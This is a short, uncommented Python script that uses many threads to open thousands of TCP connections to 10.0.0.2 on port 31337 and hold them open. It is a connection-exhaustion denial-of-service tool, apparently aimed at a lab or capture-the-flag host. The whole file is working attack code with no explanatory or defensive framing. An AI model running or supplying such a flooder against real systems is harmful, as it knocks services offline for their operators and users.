#!/usr/bin/python3

import socket
import threading

sockets = []

def connector():
    for _ in range(1000):
        s = socket.socket()
        s.connect(("10.0.0.2",31337))
        sockets.append(s)

n = input('Enter the number of thread: ')
threads = []
for _ in range(int(n)):
    t = threading.Thread(target=connector)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
